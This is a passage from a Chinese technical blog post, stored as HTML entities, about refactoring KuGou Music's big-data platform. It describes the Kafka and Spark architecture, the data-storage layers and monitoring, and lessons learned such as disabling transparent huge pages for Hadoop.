E3A;&#x4E86;&#x907F;&#x514D;&#x5927;&#x91CF;&#x6570;&#x636E;&#x6D41;(400+&#x4EBF;&#x6761;/&#x5929;)&#x5199;&#x5165;HDFS&#xFF0C;&#x5BFC;&#x81F4;HDFS&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x7A33;&#x5B9A;&#x73B0;&#x8C61;&#x53CA;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6027;&#x8003;&#x8651;&#xFF0C;&#x628A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x540E;&#x7684;&#x6570;&#x636E;&#x91CD;&#x65B0;&#x5199;&#x5165;Kafka&#x5E76;&#x4FDD;&#x7559;&#x4E00;&#x5B9A;&#x5468;&#x671F;&#xFF0C;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(&#x6279;&#x5904;&#x7406;)&#x901A;&#x8FC7;KG-Camus&#x62C9;&#x5230;HDFS(&#x901A;&#x8FC7;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x76F8;&#x5E94;&#x7684;&#x4F5C;&#x4E1A;&#x8BA1;&#x5212;)&#xFF0C;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x57FA;&#x4E8E;Storm/JStorm&#x76F4;&#x63A5;&#x4ECE;Kafka&#x6D88;&#x8D39;&#xFF0C;&#x6709;&#x5F88;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;storm-kafka&#x7EC4;&#x4EF6;&#x3002;</p>\n<p>&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(&#x6279;&#x5904;&#x7406;)&#xFF1A;&#x901A;&#x8FC7;spark&#xFF0C;spark SQL&#x5B9E;&#x73B0;&#xFF0C;&#x6574;&#x4F53;&#x6027;&#x80FD;&#x6BD4;hive&#x63D0;&#x9AD8;5&#x2014;10&#x500D;&#xFF0C;hive&#x811A;&#x672C;&#x90FD;&#x5728;&#x8F6C;&#x6362;&#x4E3A;Spark/Spark SQL;&#x90E8;&#x5206;&#x590D;&#x6742;&#x7684;&#x4F5C;&#x4E1A;&#x8FD8;&#x662F;&#x901A;&#x8FC7;Hive/Spark&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x516C;&#x53F8;&#x90FD;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;&#x4E5F;&#x6709;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x53EA;&#x662F;&#x6211;&#x4EEC;&#x5728;&#x505A;&#x5B58;&#x50A8;&#x5206;&#x5C42;&#x8BBE;&#x8BA1;&#x65F6;&#x5F31;&#x5316;&#x4E86;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x6982;&#x5FF5;&#x3002;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5206;&#x5C42;&#x6A21;&#x578B;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/7.jpg\" alt=\"&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5206;&#x5C42;\"></p>\n<p>&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x6A21;&#x578B;&#x5206;&#x4E3A;&#xFF1A;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5C42;Data Cache Layer(DCL)&#x3001;&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;Data Detail Layer(DDL)&#x3001;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;(Common)&#x3001;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;Data Summary Layer(DSL)&#x3001;&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;Data Application Layer(DAL)&#x3001;&#x6570;&#x636E;&#x5206;&#x6790;&#x5C42;(Analysis)&#x3001;&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x5C42;(Temp)&#x3002;<br>&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5C42;(DCL)&#xFF1A;&#x5B58;&#x50A8;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4E0A;&#x62A5;&#x7684;&#xFF0C;&#x7ECF;&#x8FC7;&#x89E3;&#x7801;&#x3001;&#x6E05;&#x6D17;&#x3001;&#x8F6C;&#x6362;&#x540E;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#xFF0C;&#x4E3A;&#x6570;&#x636E;&#x8FC7;&#x6EE4;&#x505A;&#x51C6;&#x5907;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;(DDL)&#xFF1A;&#x5B58;&#x50A8;&#x63A5;&#x53E3;&#x7F13;&#x51B2;&#x5C42;&#x6570;&#x636E;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#x540E;&#x7684;&#x660E;&#x7EC6;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;(Common)&#xFF1A;&#x4E3B;&#x8981;&#x5B58;&#x50A8;&#x7EF4;&#x8868;&#x6570;&#x636E;&#x4E0E;&#x5916;&#x90E8;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;(DSL)&#xFF1A;&#x5B58;&#x50A8;&#x5BF9;&#x660E;&#x7EC6;&#x6570;&#x636E;&#xFF0C;&#x6309;&#x4E1A;&#x52A1;&#x4E3B;&#x9898;&#xFF0C;&#x4E0E;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x540E;&#x7684;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x4E3B;&#x9898;&#x6570;&#x636E;&#x3001;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x5BBD;&#x8868;&#x6570;&#x636E;&#x3001;&#x8F7B;&#x91CF;&#x6C47;&#x603B;&#x6570;&#x636E;&#x7B49;&#x3002;&#x4E3A;&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;&#x7EDF;&#x8BA1;&#x8BA1;&#x7B97;&#x63D0;&#x4F9B;&#x57FA;&#x7840;&#x6570;&#x636E;&#x3002;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;&#x7684;&#x6570;&#x636E;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#x5728;&#x96C6;&#x7FA4;&#x4E2D;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;(DAL)&#xFF1A;&#x5B58;&#x50A8;&#x8FD0;&#x8425;&#x5206;&#x6790;(Operations Analysis )&#x3001;&#x6307;&#x6807;&#x4F53;&#x7CFB;(Metrics System)&#x3001;&#x7EBF;&#x4E0A;&#x670D;&#x52A1;(Online Service)&#x4E0E;&#x7528;&#x6237;&#x5206;&#x6790;(User Analysis)&#x7B49;&#x3002;&#x9700;&#x8981;&#x5BF9;&#x5916;&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x8FD9;&#x4E00;&#x5C42;&#x3002;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x70ED;&#x6570;&#x636E;&#x90E8;&#x5206;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x5468;&#x671F;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x9700;&#x8981;&#x5230;DSL&#x5C42;&#x88C5;&#x8F7D;&#x67E5;&#x8BE2;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5206;&#x6790;&#x5C42;(Analysis)&#xFF1A;&#x5B58;&#x50A8;&#x5BF9;&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;&#x3001;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;&#x3001;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;&#x5173;&#x8054;&#x540E;&#x7ECF;&#x8FC7;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;&#x7684;&#x3001;&#x4E3A;&#x63A8;&#x8350;&#x3001;&#x5E7F;&#x544A;&#x3001;&#x699C;&#x5355;&#x7B49;&#x6570;&#x636E;&#x6316;&#x6398;&#x9700;&#x6C42;&#x63D0;&#x4F9B;&#x4E2D;&#x95F4;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x5C42;(Temp)&#xFF1A;&#x5B58;&#x50A8;&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x3001;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x6821;&#x9A8C;&#x7B49;&#x751F;&#x4EA7;&#x7684;&#x4E34;&#x65F6;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#xFF1A;&#x57FA;&#x4E8E;Storm/JStorm&#xFF0C;Drools,Esper&#x3002;&#x4E3B;&#x8981;&#x5E94;&#x7528;&#x4E8E;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x3001;APM&#x3001;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;&#x3001;&#x5B9E;&#x65F6;DAU&#x7EDF;&#x8BA1;&#x7B49;&#x3002;</p>\n<p>HBase/MySQL&#xFF1A;&#x7528;&#x4E8E;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#xFF0C;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x670D;&#x52A1;&#x3002;</p>\n<p>Redis&#xFF1A;&#x7528;&#x4E8E;&#x4E2D;&#x95F4;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x6216;&#x5B57;&#x5178;&#x6570;&#x636E;&#x7B49;&#x3002;</p>\n<p>Elasticsearch&#xFF1A;&#x7528;&#x4E8E;&#x660E;&#x7EC6;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x67E5;&#x8BE2;&#x53CA;HBase&#x7684;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x5B58;&#x50A8;(&#x8FD9;&#x5757;&#x76EE;&#x524D;&#x5728;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x8FD8;&#x6CA1;&#x6709;&#x5927;&#x89C4;&#x6A21;&#x4F7F;&#x7528;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x6211;&#x4EEC;&#x4E00;&#x8D77;&#x73A9;ES)&#x3002;</p>\n<p>Druid&#xFF1A;&#x76EE;&#x524D;&#x7528;&#x4E8E;&#x652F;&#x6301;&#x5927;&#x6570;&#x636E;&#x96C6;&#x7684;&#x5FEB;&#x901F;&#x5373;&#x5E2D;&#x67E5;&#x8BE2;(ad-hoc)&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF1A;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5305;&#x62EC;&#x57FA;&#x7840;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E0E;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5206;&#x4E3A;2&#x5927;&#x65B9;&#x5411;&#xFF0C;&#x5B8F;&#x89C2;&#x5C42;&#x9762;&#x548C;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#x3002;&#x5B8F;&#x89C2;&#x89D2;&#x5EA6;&#x7684;&#x7406;&#x89E3;&#x5C31;&#x662F;&#x8FDB;&#x7A0B;&#x7EA7;&#x522B;,&#x62D3;&#x6251;&#x7ED3;&#x6784;&#x7EA7;&#x522B;,&#x62FF;Hadoop&#x4E3E;&#x4F8B;&#xFF0C;&#x5982;&#xFF1A;DataNode&#xFF0C;NameNode&#xFF0C;JournalNode&#xFF0C;ResourceManager&#xFF0C;NodeManager&#xFF0C;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x8FD9;5&#x5927;&#x7EC4;&#x4EF6;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x6790;&#x8FD9;&#x4E9B;&#x8282;&#x70B9;&#x4E0A;&#x7684;&#x76D1;&#x63A7;&#x6570;&#x636E;&#xFF0C;&#x4E00;&#x822C;&#x4F60;&#x80FD;&#x591F;&#x5B9A;&#x4F4D;&#x5230;&#x6162;&#x8282;&#x70B9;&#xFF0C;&#x53EF;&#x80FD;&#x67D0;&#x53F0;&#x673A;&#x5668;&#x7684;&#x7F51;&#x7EDC;&#x51FA;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x67D0;&#x53F0;&#x673A;&#x5668;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x603B;&#x662F;&#x5927;&#x4E8E;&#x6B63;&#x5E38;&#x673A;&#x5668;&#x7B49;&#x7B49;&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#x3002;&#x521A;&#x521A;&#x8BF4;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x65B9;&#x5411;&#xFF0C;&#x5C31;&#x662F;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#xFF0C;&#x5C31;&#x662F;&#x7EC6;&#x7C92;&#x5EA6;&#x5316;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x57FA;&#x4E8E;user&#x7528;&#x6237;&#x7EA7;&#x522B;&#xFF0C;&#x57FA;&#x4E8E;&#x5355;&#x4E2A;job&#xFF0C;&#x5355;&#x4E2A;task&#x7EA7;&#x522B;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x50CF;&#x8FD9;&#x7C7B;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x5927;&#x65B9;&#x5411;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x5728;&#x5B9E;&#x9645;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E2D;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x4E00;&#x65E6;&#x4F60;&#x7684;&#x96C6;&#x7FA4;&#x8D44;&#x6E90;&#x662F;&#x5F00;&#x653E;&#x7ED9;&#x5916;&#x9762;&#x7684;&#x7528;&#x6237;&#x4F7F;&#x7528;&#xFF0C;&#x7528;&#x6237;&#x672C;&#x8EAB;&#x4E0D;&#x4E86;&#x89E3;&#x4F60;&#x7684;&#x8FD9;&#x5957;&#x673A;&#x5236;&#x539F;&#x7406;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x4F1A;&#x4E71;&#x7533;&#x8BF7;&#x8D44;&#x6E90;&#xFF0C;&#x9020;&#x6210;&#x4E25;&#x91CD;&#x62D6;&#x57AE;&#x96C6;&#x7FA4;&#x6574;&#x4F53;&#x8FD0;&#x4F5C;&#x6548;&#x7387;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x7C7B;&#x76D1;&#x63A7;&#x7684;&#x6307;&#x6807;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x6837;&#x7684;&#x4E8B;&#x60C5;&#x53D1;&#x751F;&#x3002;&#x76EE;&#x524D;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x5B8F;&#x89C2;&#x5C42;&#x9762;&#x7684;&#x76D1;&#x63A7;&#x3002;&#x5982;&#xFF1A;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5B9E;&#x73B0;&#x65B9;&#x6848;&#x5982;&#x4E0B;:</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/8.jpg\" alt=\"&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;\"></p>\n<h2 id=\"&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;\"><a href=\"#&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;\" class=\"headerlink\" title=\"&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;\"></a>&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;</h2><p>&#x6211;&#x4EEC;&#x5728;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x5927;&#x81F4;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3001;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x3001;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x4E09;&#x7C7B;&#xFF0C;&#x4E0B;&#x9762;&#x4E3B;&#x8981;&#x5217;&#x4E3E;&#x4E9B;&#x6BD4;&#x8F83;&#x5178;&#x578B;&#x7684;&#xFF0C;&#x82B1;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x957F;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<h3 id=\"1-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;\"><a href=\"#1-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;\" class=\"headerlink\" title=\"1. &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;\"></a>1. &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;</h3><p>Hadoop&#x7684;I/O&#x6027;&#x80FD;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x4F9D;&#x8D56;&#x4E8E;Linux&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#x3002;Linux&#x4E2D;&#x6709;&#x591A;&#x79CD;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#xFF0C;&#x6BD4;&#x5982;ext3&#x548C;ext4&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5DEE;&#x522B;&#x3002;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x60F3;&#x5229;&#x7528;ext4&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x90FD;&#x662F;CentOS5.9&#x4E0D;&#x652F;&#x6301;ext4&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5347;&#x7EA7;&#x4E3A;CentOS6.3&#x7248;&#x672C;&#xFF0C;&#x90E8;&#x7F72;Hadoop&#x96C6;&#x7FA4;&#x540E;&#xFF0C;&#x4F5C;&#x4E1A;&#x4E00;&#x542F;&#x52A8;&#xFF0C;&#x5C31;&#x51FA;&#x73B0;CPU&#x5185;&#x6838;&#x8FC7;&#x9AD8;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/9.jpg\" alt=\"hodoop&#x96C6;&#x7FA4;&#xFF0C;CPU&#x8FC7;&#x9AD8;\"></p>\n<p>&#x7ECF;&#x8FC7;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#x7684;&#x6D4B;&#x8BD5;&#x9A8C;&#x8BC1;&#xFF0C;&#x53D1;&#x73B0;CentOS6&#x4F18;&#x5316;&#x4E86;&#x5185;&#x5B58;&#x7533;&#x8BF7;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5F15;&#x5165;&#x4E86;THP&#x7684;&#x7279;&#x6027;&#xFF0C;&#x800C;Hadoop&#x662F;&#x9AD8;&#x5BC6;&#x96C6;&#x578B;&#x5185;&#x5B58;&#x8FD0;&#x7B97;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x4E2A;&#x6539;&#x52A8;&#x7ED9;hadoop&#x5E26;&#x6765;&#x4E86;&#x526F;&#x4F5C;&#x7528;&#x3002;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x5185;&#x6838;&#x53C2;&#x6570;&#x4F18;&#x5316;&#x5173;&#x95ED;&#x7CFB;&#x7EDF;THP&#x7279;&#x6027;&#xFF0C;CPU&#x5185;&#x6838;&#x4F7F;&#x7528;&#x7387;&#x9A6C;&#x4E0A;&#x4E0B;&#x964D;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;:<br>echo never &gt; /sys/kernel/mm/redhat_transparent_hugepage/enabled<br>echo never &gt; /sys/kernel/mm/redhat_transparent_hugepage/defrag</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/10.jpg\" alt=\"THP&#x7684;&#x597D;&#x5904;\"></p>\n<h3 id=\"2-&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;\"><a href=\"#2-&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;\" class=\"headerlink\" title=\"2.&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;\"></a>2.&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;</h3><p>&#x6700;&#x521D;&#x7684;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x662F;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x628A;&#x6570;&#x636E;&#x4E0A;&#x62A5;&#x7ED9;Kafka&#xFF0C;&#x518D;&#x7531;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;(ETL)&#x505A;&#x9884;&#x5904;&#x7406;&#x540E;&#x76F4;&#x63A5;&#x5B9E;&#x65F6;&#x5199;&#x5165;HDFS&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/11.jpg\" alt=\"HDFS\"></p>\n<p>&#x6B64;&#x67B6;&#x6784;&#xFF0C;&#x9700;&#x8981;&#x7EF4;&#x6301;HDFS Client&#x7684;&#x957F;&#x8FDE;&#x63A5;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x7B49;&#x5404;&#x79CD;&#x539F;&#x56E0;&#x5BFC;&#x81F4;Storm&#x5B9E;&#x65F6;&#x5199;&#x5165;HDFS&#x7ECF;&#x5E38;&#x4E0D;&#x7A33;&#x5B9A;&#xFF0C;&#x9694;&#x4E09;&#x5DEE;&#x4E94;&#x7684;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5F02;&#x5E38;&#xFF0C;&#x4F7F;&#x540E;&#x9762;&#x7684;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5F02;&#x5E38;&#x4E0D;&#x65AD;&#xFF0C;&#x5F53;&#x65F6;&#x5C1D;&#x8BD5;&#x8FC7;&#x5F88;&#x591A;&#x79CD;&#x624B;&#x6BB5;&#x53BB;&#x4F18;&#x5316;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x8BC1;&#x957F;&#x8FDE;&#x63A5;&#x3001;&#x8FDE;&#x63A5;&#x65AD;&#x540E;&#x91CD;&#x8BD5;&#x673A;&#x5236;&#x3001;&#x8C03;&#x6574;HDFS&#x670D;&#x52A1;&#x7AEF;&#x53C2;&#x6570;&#x7B49;&#xFF0C;&#x90FD;&#x89E3;&#x51B3;&#x7684;&#x4E0D;&#x662F;&#x5F7B;&#x5E95;&#x3002;<br>&#x6BCF;&#x5929;&#x5F02;&#x5E38;&#x4E0D;&#x65AD;&#xFF0C;&#x65E7;&#x5F02;&#x5E38;&#x6CA1;&#x89E3;&#x51B3;&#xFF0C;&#x65B0;&#x5F02;&#x5E38;&#x53C8;&#x6765;&#x4E86;&#xFF0C;&#x5728;&#x538B;&#x529B;&#x5C71;&#x5927;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8003;&#x8651;&#x4ECE;&#x67B6;&#x6784;&#x89D2;&#x5EA6;&#x8C03;&#x6574;&#xFF0C;&#x4E0D;&#x80FD;&#x53EA;&#x4ECE;&#x5177;&#x4F53;&#x7684;&#x6280;&#x672F;&#x70B9;&#x53BB;&#x4F18;&#x5316;&#x4E86;&#xFF0C;&#x5728;&#x505A;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x65F6;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x6211;&#x4EEC;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x521D;&#x8877;&#xFF0C;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#xFF0C;&#x5C3D;&#x91CF;&#x8BA9;&#x8BA1;&#x7B97;&#x4EFB;&#x52A1;&#x5B9E;&#x65F6;&#x5316;&#xFF0C;&#x4F46;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8981;&#x8003;&#x8651;&#x73B0;&#x6709;&#x4E1A;&#x52A1;&#x7684;&#x8FC7;&#x6E21;&#xFF0C;&#x6240;&#x4EE5;&#x67B6;&#x6784;&#x5FC5;&#x987B;&#x652F;&#x6301;&#x5B9E;&#x65F6;&#x4E0E;&#x79BB;&#x7EBF;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x7ED3;&#x5408;&#x8FD9;&#x4E9B;&#x9700;&#x6C42;&#xFF0C;&#x5728;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;(ETL)&#x540E;&#x52A0;&#x4E86;&#x4E00;&#x5C42;&#x6570;&#x636E;&#x7F13;&#x5B58;&#x91CD;&#x7528;&#x5C42;(kafka)&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;&#x540E;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x662F;&#x5199;&#x5165;kafka&#x96C6;&#x7FA4;&#xFF0C;&#x7531;&#x4E8E;kafka&#x652F;&#x6301;&#x91CD;&#x590D;&#x6D88;&#x8D39;&#xFF0C;&#x6240;&#x4EE5;&#x540C;&#x4E00;&#x